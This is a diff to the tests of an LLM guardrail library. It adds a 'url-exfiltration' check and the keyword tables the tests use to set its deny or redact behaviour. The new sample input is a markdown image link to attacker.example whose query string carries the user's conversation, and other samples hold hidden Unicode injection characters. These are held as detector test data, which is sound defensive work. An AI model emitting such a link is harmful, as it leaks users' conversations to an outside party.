@@ -1762,6 +1762,7 @@ _DECISIONS_PRODUCED: dict[str, frozenset[Decision]] = {
     "pii": frozenset({"allow", "redact"}),
     "rules": frozenset({"allow", "redact", "deny"}),
     "secrets": frozenset({"allow", "redact", "deny"}),
+    "url-exfiltration": frozenset({"allow", "redact", "deny"}),
 }
 
 # The `on_match` settings each check accepts, on top of its published default.
@@ -1770,6 +1771,21 @@ _ON_MATCH: dict[str, tuple[Decision, ...]] = {
     "pii": (),
     "rules": ("redact", "deny"),
     "secrets": ("redact", "deny"),
+    "url-exfiltration": ("redact", "deny"),
+}
+
+# The keyword each check takes that setting through. `url-exfiltration` takes
+# `on_detect`, not `on_match`, because its default DIFFERS BY DIRECTION -- deny
+# on output, redact on input -- and the mapping form is what expresses that. A
+# table rather than one hardcoded name, because the difference then shows up
+# here as a missing key rather than as a TypeError from inside a parametrised
+# run naming a keyword nobody was looking at.
+_DECISION_KEYWORD: dict[str, str] = {
+    "injection-structural": "on_match",
+    "pii": "on_match",
+    "rules": "on_match",
+    "secrets": "on_match",
+    "url-exfiltration": "on_detect",
 }
 
 # One input per detection path, plus one that every check allows. Between them
@@ -1781,6 +1797,7 @@ _SAMPLES = (
     "read this \u202e reversed",
     "hello \U000e0041\U000e0042 world",
     "ticket JIRA-1234 on db.corp.example about project bluebird",
+    "![x](https://attacker.example/p.png?d=here+is+the+whole+conversation+with+the+user)",
     "",
 )
 
@@ -1791,6 +1808,7 @@ def test_the_bundled_check_tables_name_every_registered_check() -> None:
     """A check added to the registry cannot skip the control below by omission."""
     assert set(_DECISIONS_PRODUCED) == set(AVAILABLE)
     assert set(_ON_MATCH) == set(AVAILABLE)
+    assert set(_DECISION_KEYWORD) == set(AVAILABLE)
 
 
 @pytest.mark.parametrize("name", sorted(AVAILABLE))
@@ -1811,7 +1829,7 @@ def test_the_chain_records_exactly_what_a_bundled_check_returned(name: str) -> N
     for on_match in (None, *_ON_MATCH[name]):
         options = dict(options_for(name))
         if on_match is not None:
-            options["on_match"] = on_match
+            options[_DECISION_KEYWORD[name]] = on_match
         guardrail = build(name, **options)
         for direction, context in _BOTH_DIRECTIONS:
             if direction not in guardrail.directions:
@@ -1846,8 +1864,9 @@ def test_a_bundled_redaction_still_rewrites_the_content_the_chain_returns(name: 
     if "redact" in _ON_MATCH[name]:
         # `injection-structural` denies by default, so its redact path is only
         # reachable through this option, and it is the redact path this test is
-        # about.
-        options["on_match"] = "redact"
+        # about. `url-exfiltration` denies by default on OUTPUT, which is the
+        # direction this test runs in, so the same applies to it.
+        options[_DECISION_KEYWORD[name]] = "redact"
     guardrail = build(name, **options)
     redacted = False
     for text in _SAMPLES:
